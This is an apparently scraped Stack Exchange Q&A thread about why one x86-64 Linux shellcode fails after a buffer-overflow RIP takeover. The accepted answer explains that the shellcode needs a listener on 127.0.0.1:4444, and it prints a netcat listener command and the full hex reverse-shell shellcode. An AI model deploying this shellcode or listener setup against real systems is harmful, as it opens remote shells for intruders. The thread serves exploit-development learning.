{
    "title": "One shellcode works, one doesn't - an issue with exploiting a 64 bit linux binary",
    "link": "https://reverseengineering.stackexchange.com/questions/9506/one-shellcode-works-one-doesnt-an-issue-with-exploiting-a-64-bit-linux-binar",
    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I'm working on exploiting a simple 64 bit linux binary. I got control of RIP by exploiting a buffer overflow and using a jmp rsp to get control of the progrm.</p>\n<p>However, I'm having trouble with the shellcode piece. I'm not savvy enough to write my own, so I've been using some I found online. The shellcode needs to get me a reverse shell on port 4444.</p>\n<p>Just for testing though, I tried some basic shellcode.</p>\n<p>Works - <a href=\"http://shell-storm.org/shellcode/files/shellcode-806.php\" rel=\"nofollow\">http://shell-storm.org/shellcode/files/shellcode-806.php</a></p>\n<p>Doesn't work - <a href=\"https://www.exploit-db.com/exploits/35587/\" rel=\"nofollow\">https://www.exploit-db.com/exploits/35587/</a></p>\n<p>The shellcode in the first link works. The one in the second did not.</p>\n<p>I stepped through the program and each instruction lines up. However, after the last syscall, the program continues to execute the stack instead of exiting the thread.</p>\n<p>I could really use help on it, I've been stuck on it all day.</p>\n</div>",
    "votes": "1",
    "answers": 1,
    "views": "1k",
    "tags": [
        "linux",
        "exploit",
        "x86-64",
        "shellcode"
    ],
    "user": "Smipims",
    "time": "Jul 30, 2015 at 19:15",
    "comments": [],
    "answers_data": [
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I've tested these two shellcodes and they both work.</p>\n<p>I think that you're missing the point of the second one. It's said :</p>\n<blockquote>\n<p>NOTE: This C code connects to 127.0.0.1:4444</p>\n</blockquote>\n<p>Meaning it's trying to connect to port 4444 on localhost (127.0.0.1). If nobody is listening on that port, then it won't connect and just trying to execute whatever is after you syscall.</p>\n<p>Try to execute it again, but this time you need to lauch some process waiting for a connection on port 4444 <strong>before</strong> executing your shellcode, say <em>netcat</em></p>\n<pre><code>$ nc -lp 4444 -vv \nlistening on [any] 4444 ...\n</code></pre>\n<p>And <strong>then</strong>, when you execute your shellcode</p>\n<pre><code>./execshellcode64 \"\\x31\\xf6\\xf7\\xe6\\xff\\xc6\\x6a\\x02\\x5f\\x04\\x29\\x0f\\x05\\x50\\x5f\\x52\\x52\\xc7\\x44\\x24\\x04\\x7d\\xff\\xfe\\xfe\\x81\\x44\\x24\\x04\\x02\\x01\\x01\\x02\\x66\\xc7\\x44\\x24\\x02\\x11\\x5c\\xc6\\x04\\x24\\x02\\x54\\x5e\\x6a\\x10\\x5a\\x6a\\x2a\\x58\\x0f\\x05\\x6a\\x03\\x5e\\xff\\xce\\xb0\\x21\\x0f\\x05\\x75\\xf8\\x56\\x5a\\x56\\x48\\xbf\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x0f\\x05\"\n</code></pre>\n<p><em>nectat</em> warns you (because of -vv meaning verbose) that there was a connection on that port</p>\n<pre><code> $ nc -lp 4444 -vv\nlistening on [any] 4444 ...\nconnect to [127.0.0.1] from localhost.localdomain [127.0.0.1] 40234\n</code></pre>\n<p>That's the connection initiated by your shellcode.</p>\n<p>Hope this helps !</p>\n<p><strong>Note</strong> : <em>execshellcode64</em> is just a personnal program I made for testing purpose. It's not actually a real command.</p>\n</div>",
            "votes": "1",
            "user": "Hackndo",
            "time": "Jul 31, 2015 at 6:36",
            "is_accepted": true,
            "comments": [
                {
                    "user": "Smipims",
                    "text": "<span class=\"comment-copy\">Do you mind sharing your execshellcode64 program? The one I wrote up is exhibiting similar problematic behavior.</span>",
                    "time": null
                },
                {
                    "user": "Hackndo",
                    "text": "<span class=\"comment-copy\"><a href=\"https://github.com/Hackndo/misc/blob/master/execshellcode.c\" rel=\"nofollow noreferrer\">github.com/Hackndo/misc/blob/master/execshellcode.c</a></span>",
                    "time": null
                },
                {
                    "user": "Smipims",
                    "text": "<span class=\"comment-copy\">It works for the /bin/sh shellcode, but I get an illegal instruction on the \"syscall\" when I try the netcat shellcode. Any idea?</span>",
                    "time": null
                },
                {
                    "user": "Smipims",
                    "text": "<span class=\"comment-copy\">I got it working. I'm not sure how. After just taking a break and coming at it again, it started working.</span>",
                    "time": null
                },
                {
                    "user": "Hackndo",
                    "text": "<span class=\"comment-copy\">Glad it helped then :)</span>",
                    "time": null
                }
            ]
        }
    ]
}